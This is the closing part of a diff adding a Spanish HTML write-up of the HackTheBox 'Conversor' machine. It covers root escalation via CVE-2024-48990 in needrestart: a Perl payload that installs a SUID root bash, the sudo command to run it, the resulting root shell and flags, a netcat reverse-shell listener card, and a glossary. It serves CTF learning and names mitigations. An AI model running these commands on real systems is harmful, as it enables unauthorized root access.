+          archivo de configuración. Si la configuración especifica un archivo arbitrario con
+          <code>-c</code>, Perl ejecuta ese archivo como código Perl con los privilegios de quien
+          invoca needrestart — en este caso, <strong>root</strong> (porque lo ejecutamos con sudo).
+          Podemos escribir un script Perl malicioso que se ejecutará como root.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">18</div>
+        <span class="step-title">CREAR EL SCRIPT PERL MALICIOSO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Escribimos un script Perl en <span class="hl-yel">/dev/shm/pwn.pl</span>.
+          El directorio <code style="color:var(--yellow);font-family:var(--font-mono)">/dev/shm</code>
+          es un sistema de archivos en RAM (shared memory) con permisos de escritura para todos los
+          usuarios — es el lugar ideal para archivos temporales en explotación porque no requiere
+          acceso especial y no deja rastro en disco tras un reinicio.
+        </p>
+        <p>
+          El payload usa
+          <code style="color:var(--yellow);font-family:var(--font-mono)">system('/usr/bin/install', '-m', '04755', '/bin/bash', '/usr/local/bin/bsh')</code>.
+          Desglosando: <strong>install</strong> copia un archivo con permisos específicos.
+          El flag <span class="hl-cyan">-m 04755</span> establece permisos
+          <strong>SUID</strong> (el 04 activa el setuid bit) más rwxr-xr-x normal.
+          El SUID bit en un ejecutable hace que se ejecute con los privilegios del <strong>propietario</strong>
+          del archivo en lugar del usuario que lo invoca. Como needrestart corre como root,
+          <strong>/bin/bash</strong> se copiará a <strong>/usr/local/bin/bsh</strong> siendo propiedad
+          de root y con SUID activado — lo que nos permitirá obtener una shell de root.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat > /dev/shm/pwn.pl << 'EOF'&#10;use strict; use warnings;&#10;system('/usr/bin/install','-m','04755','/bin/bash','/usr/local/bin/bsh');&#10;1;&#10;EOF">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PERL PAYLOAD</span>
+        <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd">cat &gt; <span class="arg">/dev/shm/pwn.pl</span> &lt;&lt; <span class="arg">'EOF'</span></span></div>
+        <div><span class="cmd">use strict; use warnings;</span></div>
+        <div><span class="cmd">system(<span class="arg">'/usr/bin/install'</span>,<span class="arg">'-m'</span>,<span class="arg">'04755'</span>,<span class="arg">'/bin/bash'</span>,<span class="arg">'/usr/local/bin/bsh'</span>);</div>
+        <div>1;</span></div>
+        <div><span class="cmd">EOF</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 10 ROOT ===================== -->
+    <div class="section" id="root">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Root Flag</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">19</div>
+        <span class="step-title">EJECUTAR NEEDRESTART CON EL CONFIG MALICIOSO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos needrestart con sudo especificando nuestro script Perl malicioso como archivo
+          de configuración con el flag <span class="hl-cyan">-c</span>. El flag
+          <span class="hl-cyan">-r l</span> indica el modo de reinicio "list" — útil para que
+          needrestart procese la configuración sin intentar reiniciar servicios reales.
+          Al procesar el archivo de configuración, needrestart (corriendo como root) ejecuta
+          el script Perl, que instala bash con SUID.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo needrestart -c /dev/shm/pwn.pl -r l">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">EXPLOIT</span>
+        <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd">sudo needrestart <span class="flag">-c</span> <span class="arg">/dev/shm/pwn.pl</span> <span class="flag">-r</span> <span class="arg">l</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Scanning processes ...</div>
+        <div>Scanning candidates ...</div>
+        <div>Scanning linux images ...</div>
+        <div>&nbsp;</div>
+        <div>Running kernel seems to be up-to-date.</div>
+        <div>Services to be restarted:</div>
+        <div>&nbsp; systemctl restart cron.service</div>
+        <div>No containers need to be restarted.</div>
+        <div>No user sessions are running outdated binaries.</div>
+        <div>No VM guests are running outdated hypervisor (qemu) binaries on this host.</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">20</div>
+        <span class="step-title">VERIFICAR EL SUID Y OBTENER SHELL ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Verificamos que el binario se creó correctamente con <span class="hl">ls -la</span>.
+          Los permisos <span class="hl-red">-rwsr-xr-x</span> confirman el SUID activado (la
+          <strong>s</strong> en la posición del bit de ejecución del propietario). El propietario
+          es <strong>root</strong>. Ejecutamos <span class="hl-cyan">bsh -p</span> donde el flag
+          <span class="hl-cyan">-p</span> (privileged) indica a bash que <strong>no descarte los
+          privilegios SUID</strong> — sin este flag, bash moderno detecta que el UID real no coincide
+          con el efectivo y los descarta como medida de seguridad.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ls -la /usr/local/bin/bsh && /usr/local/bin/bsh -p">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ROOT</span>
+        <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd">ls <span class="flag">-la</span> <span class="arg">/usr/local/bin/bsh</span></span></div>
+        <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd"><span class="arg">/usr/local/bin/bsh</span> <span class="flag">-p</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">-rwsr-xr-x</span> 1 root root 1396520 May 31 21:31 /usr/local/bin/bsh</div>
+        <div>&nbsp;</div>
+        <div><span class="o-red">bsh-5.1# </span>cd /root</div>
+        <div><span class="o-red">bsh-5.1# </span>ls</div>
+        <div>root.txt&nbsp; scripts</div>
+        <div><span class="o-red">bsh-5.1# </span>cat root.txt</div>
+        <div><span class="o-green">3e6b2b25df792686ef4b2e3d73fe7e58</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USER FLAG</div>
+          <div class="cred-val">9741709e16657a97c14cf281bbc33781</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">ROOT FLAG</div>
+          <div class="cred-val">3e6b2b25df792686ef4b2e3d73fe7e58</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 11 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX out.xml</div>
+          <div class="cmd-ref-desc">Escaneo completo de todos los puertos TCP con detección de versión, scripts NSE, SYN scan silencioso, sin resolución DNS ni ping previo, velocidad máxima, guardando resultado en XML.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> — todos los 65,535 puertos TCP</li>
+            <li><span>-sSCV</span> — SYN scan + scripts NSE + versiones</li>
+            <li><span>-n / -Pn</span> — sin DNS / sin ping previo</li>
+            <li><span>--min-rate=5000</span> — mínimo 5,000 pkt/s</li>
+            <li><span>-oX</span> — output en formato XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc /usr/share/nmap/nmap.xsl out.xml &gt; out.html</div>
+          <div class="cmd-ref-desc">Transforma el XML de salida de nmap usando la hoja de estilo XSLT incluida con nmap, generando un HTML visual con tablas y colores para incluir en reportes.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>nmap.xsl</span> — hoja de estilo XSLT de nmap</li>
+            <li><span>&gt; out.html</span> — redirige salida a archivo</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sqlite3</div>
+          <div class="cmd-ref-syntax">sqlite3 users.db "SELECT * FROM users;"</div>
+          <div class="cmd-ref-desc">Cliente de línea de comandos para bases de datos SQLite. Permite ejecutar consultas SQL directamente sobre el archivo .db sin necesidad de servidor de base de datos.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>"SELECT * FROM users"</span> — recuperar todos los registros</li>
+            <li><span>.tables</span> — listar tablas disponibles</li>
+            <li><span>.schema</span> — ver estructura de la tabla</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">needrestart</div>
+          <div class="cmd-ref-syntax">sudo needrestart -c /ruta/config.pl -r l</div>
+          <div class="cmd-ref-desc">Utilidad Ubuntu/Debian que detecta servicios a reiniciar. Vulnerable a CVE-2024-48990: el flag -c permite especificar un archivo Perl de configuración arbitrario que se ejecuta con los privilegios de quien invoca needrestart.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-c</span> — archivo de configuración alternativo (Perl)</li>
+            <li><span>-r l</span> — modo list, sin reiniciar servicios</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">install (GNU)</div>
+          <div class="cmd-ref-syntax">/usr/bin/install -m 04755 /bin/bash /usr/local/bin/bsh</div>
+          <div class="cmd-ref-desc">Copia archivos estableciendo permisos específicos en la operación. Más potente que cp+chmod porque es atómico. El modo 04755 activa el bit SUID (04000) más permisos rwxr-xr-x.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-m 04755</span> — SUID + rwxr-xr-x</li>
+            <li><span>04000</span> — bit setuid en octal</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nc (netcat)</div>
+          <div class="cmd-ref-syntax">nc -lvnp 4444</div>
+          <div class="cmd-ref-desc">Swiss army knife de redes. En modo listener espera conexiones TCP/UDP entrantes. Fundamental para recibir reverse shells: cuando el objetivo se conecta, obtenemos su stdin/stdout como entrada/salida local.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> — modo escucha (listen)</li>
+            <li><span>-v</span> — verbose, muestra mensajes</li>
+            <li><span>-n</span> — sin resolución DNS</li>
+            <li><span>-p 4444</span> — puerto de escucha</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 12 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 12</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">XSLT Injection — Inyección de Hojas de Estilo</div>
+          <div class="glos-def">
+            <strong>XSLT (eXtensible Stylesheet Language Transformations)</strong> es un lenguaje
+            declarativo para transformar documentos XML en otros formatos (HTML, PDF, texto).
+            Es Turing-completo y sus extensiones permiten operaciones del sistema de archivos.
+            La extensión <strong>exsl:document</strong> (parte del estándar EXSLT) permite crear
+            y escribir archivos durante una transformación. Cuando una aplicación acepta hojas de
+            estilo XSLT proporcionadas por el usuario sin restricciones, un atacante puede inyectar
+            código XSLT malicioso que escriba archivos arbitrarios en el servidor, ejecute código,
+            o lea datos internos. La mitigación correcta es aplicar un <code>XSLTSecurityPreferences</code>
+            que restrinja el acceso al sistema de archivos y la red desde las transformaciones.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Cron Job Abuse — Abuso de Tareas Programadas</div>
+          <div class="glos-def">
+            <strong>cron</strong> es el daemon de Unix para programar tareas periódicas. Su configuración
+            principal (<code>/etc/crontab</code>) define qué comandos ejecutar, con qué frecuencia y
+            bajo qué usuario. Si una tarea cron ejecuta scripts de un directorio donde un usuario
+            sin privilegios tiene permisos de escritura, ese usuario puede colocar código malicioso
+            que se ejecutará automáticamente con los privilegios del usuario de la tarea. En Conversor,
+            la combinación de escritura arbitraria de archivos (via XSLT Injection) en el directorio
+            <code>scripts/</code> más el cron que ejecuta todo .py en ese directorio como www-data
+            crean una cadena de explotación completa sin necesidad de ninguna interacción adicional.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SUID Bit — Set User ID</div>
+          <div class="glos-def">
+            El <strong>SUID bit</strong> (Set User ID upon execution) es un permiso especial de Unix
+            que, cuando se establece en un ejecutable, hace que ese ejecutable se ejecute con los
+            privilegios del <strong>propietario del archivo</strong> en lugar del usuario que lo invoca.
+            Si un ejecutable con SUID pertenece a root, cualquier usuario puede obtener privilegios de
+            root ejecutándolo. En octal se representa como <code>4000</code>, visible como la letra
+            <code>s</code> en la posición de ejecución del propietario (<code>-rwsr-xr-x</code>).
+            La técnica de copiar bash con SUID es clásica en CTF: <code>bash -p</code> activa el modo
+            privilegiado que respeta los privilegios del propietario.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">XXE vs XSLT Injection — Diferencias</div>
+          <div class="glos-def">
+            <strong>XXE (XML External Entity)</strong> es una vulnerabilidad en el parser XML que
+            permite incluir entidades externas (archivos del servidor, URLs de red) al procesar XML.
+            Conversor lo mitiga configurando el XMLParser con <code>resolve_entities=False</code> y
+            <code>no_network=True</code>. Sin embargo, no aplicó las mismas restricciones al parser
+            XSLT — que es donde reside la vulnerabilidad real. La lección: proteger solo una parte
+            del pipeline de procesamiento no es suficiente. Cada componente que procesa input del
+            usuario debe ser auditado y restringido independientemente.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2024-48990 — needrestart Perl Injection</div>
+          <div class="glos-def">
+            <strong>CVE-2024-48990</strong> es una vulnerabilidad de escalada de privilegios en
+            <strong>needrestart</strong> versiones anteriores a 3.8, presente en Ubuntu 22.04 y
+            derivados. needrestart utiliza Perl para procesar su archivo de configuración.
+            El flag <code>-c</code> permite especificar un archivo de configuración alternativo.
+            Como needrestart suele ejecutarse con sudo (o como root via systemd), un usuario que
+            pueda ejecutarlo con <code>sudo -c /ruta/payload.pl</code> puede hacer que root ejecute
+            código Perl arbitrario. La vulnerabilidad es especialmente peligrosa porque needrestart
+            es un paquete común en Ubuntu instalado por defecto en muchas configuraciones. La
+            mitigación es actualizar a needrestart 3.8 o restringir el uso de <code>-c</code> en
+            las reglas sudo.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">MD5 — Message Digest 5</div>
+          <div class="glos-def">
+            <strong>MD5</strong> es un algoritmo de hash criptográfico produciendo un digest de 128
+            bits (32 caracteres hexadecimales). Diseñado en 1991, está considerado completamente
+            <strong>roto para uso en contraseñas</strong> por tres razones: (1) es extremadamente
+            rápido, permitiendo miles de millones de intentos por segundo con GPUs modernas; (2) no
+            usa <strong>salt</strong> por defecto, haciendo posibles los ataques de rainbow tables
+            (bases de datos precomputadas de hash↔password); (3) tiene colisiones conocidas. Las
+            alternativas modernas son bcrypt, Argon2 y scrypt, diseñados específicamente para ser
+            lentos y resistentes a hardware especializado.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Information Disclosure — Exposición de Información</div>
+          <div class="glos-def">
+            <strong>Information Disclosure</strong> es una categoría de vulnerabilidad web (CWE-200)
+            donde una aplicación expone información sensible a usuarios no autorizados. En Conversor,
+            la exposición del código fuente completo en <code>/static/source_code.tar.gz</code> sin
+            autenticación permite a cualquier visitante leer la lógica interna, encontrar las rutas
+            de archivos del servidor, identificar la base de datos SQLite incluida en el paquete
+            (<code>instance/users.db</code>), y descubrir el cron job en <code>install.md</code>.
+            Esta única vulnerabilidad fue la que reveló toda la cadena de ataque necesaria para
+            comprometer la máquina.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Pseudo-TTY — Terminal Virtual Interactiva</div>
+          <div class="glos-def">
+            Una <strong>TTY (TeleTYpewriter)</strong> es la interfaz estándar entre el usuario y
+            el shell en Unix. Una reverse shell básica de netcat carece de TTY: no tiene línea de
+            edición, no soporta Ctrl+C correctamente (mata la shell completa), y comandos como
+            <code>su</code> o <code>sudo</code> fallan porque requieren un terminal real para pedir
+            contraseñas. <strong>pty.spawn("/bin/bash")</strong> crea un pseudo-TTY (par de
+            dispositivos pts/ptmx) que emula un terminal real, habilitando autocompletado, historial
+            de comandos, control de trabajos y compatibilidad con programas interactivos.
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
